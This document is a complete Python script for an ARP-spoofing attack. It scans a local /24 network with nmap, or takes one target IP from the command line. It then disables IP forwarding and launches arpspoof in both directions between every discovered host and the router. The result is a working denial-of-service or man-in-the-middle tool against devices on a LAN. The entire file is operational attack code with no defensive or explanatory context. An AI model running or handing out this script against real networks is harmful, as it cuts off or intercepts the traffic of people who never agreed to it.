#!/usr/bin/python3


import os
import sys
import nmap3


interface = sys.argv[1]
router_ip = sys.argv[2]
victims = []


def attack(ips):
	for ip in ips:
		os.system(f"xterm -e arpspoof -i {interface} -t {ip} {router_ip} &")
		os.system(f"xterm -e arpspoof -i {interface} -t {router_ip} {ip} &")

	os.system("xterm -e ping localhost")


def disable_ip_forward():
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def scanner(ip):
	global victims

	nmap = nmap3.NmapScanTechniques()
	victims = nmap.nmap_ping_scan(ip)
	result = []

	print("")
	for element in victims:
		addr = element["addresses"][0]["addr"]
		if addr != router_ip:
			result.append(addr)
			print(" -- " + addr)

	if len(result) < 1:
		print("No computers were found on the local network, try again.")
		raise SystemExit
	else:
		print("")
		answer = input("Continue? [Y/n] ")

		if answer.lower() != 'y':
			raise SystemExit

	victims = result
	return victims


if __name__ == "__main__":
	print("Setting IP forward on your PC..")
	disable_ip_forward()

	try:
		victims.append(sys.argv[3])
		print("The only victim exposed", sys.argv[3])
	except:
		print("Scanning computers in local network..")
		scanner("192.168.1.0/24")

	print("Running the attack..")
	attack(victims)




